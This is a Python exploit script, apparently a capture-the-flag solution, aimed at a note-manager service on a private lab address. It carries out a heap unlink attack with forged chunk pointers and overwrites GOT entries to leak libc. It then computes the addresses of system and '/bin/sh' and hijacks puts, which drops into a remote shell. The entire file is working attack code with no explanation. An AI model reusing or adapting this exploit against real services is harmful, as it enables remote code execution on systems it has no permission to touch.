#!/usr/bin/env python
from sc_pwn import *

rhp     = ("192.168.75.129",8080)

addr_got_puts       = 0x0804a008
addr_got_main       = 0x0804a014
addr_count          = 0x0804a04c
addr_heap           = 0x0804a060

offset_libc_main    = 0x00019990
offset_libc_system  = 0x00040190
offset_libc_str_sh  = 0x00160a24

#==========
def attack(nc):
    for i in range(2):
        add_note(0)

    exploit_st1  = '\x00'*0xc
    exploit_st1 += pack_32(heap_sb(0x18,PREV_INUSE))
    exploit_st1 += pack_32(addr_heap+0x4)
    exploit_st1 += pack_32(addr_heap-0x4)
    change_note(0, exploit_st1)

    remove_note(1)

    exploit_st2  = pack_32(addr_count)
    exploit_st2 += pack_32(addr_got_main)
    exploit_st2 += pack_32(addr_got_puts)
    change_note(0, exploit_st2)
    change_note(1, pack_32(3))

    addr_libc_main      = unpack_32(print_note(2)[:4])
    addr_base_libc      = addr_libc_main - offset_libc_main
    addr_libc_system    = addr_base_libc + offset_libc_system
    addr_libc_str_sh    = addr_base_libc + offset_libc_str_sh
    
    info("addr_libc_main    = 0x%08x"%addr_libc_main)
    info("addr_libc_system  = 0x%08x"%addr_libc_system)
    info("addr_libc_str_sh  = 0x%08x"%addr_libc_str_sh)

    change_note(0, pack_32(addr_libc_str_sh))
    change_note(3, pack_32(addr_libc_system))
    
    nc.read_all()
    nc.sendln('4')
    nc.read_until('id.\n')
    nc.sendln(str(1))

def add_note(size):
    nc.read_all()
    nc.sendln('1')
    nc.read_until('size.\n')
    nc.sendln(str(size))
    
def remove_note(id):
    nc.read_all()
    nc.sendln('2')
    nc.read_until('id.\n')
    nc.sendln(str(id))
    
def change_note(id,data):
    nc.read_all()
    nc.sendln('3')
    nc.read_until('id.\n')
    nc.sendln(str(id))
    nc.read_until('size.\n')
    nc.sendln(str(len(data)))
    nc.read_until('data.\n')
    nc.sendln(data)

def print_note(id):
    nc.read_all()
    nc.sendln('4')
    nc.read_until('id.\n')
    nc.sendln(str(id))
    txt = nc.read_until('following:\n')
    return txt[:txt[:-1].rfind('\n')]
    
#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
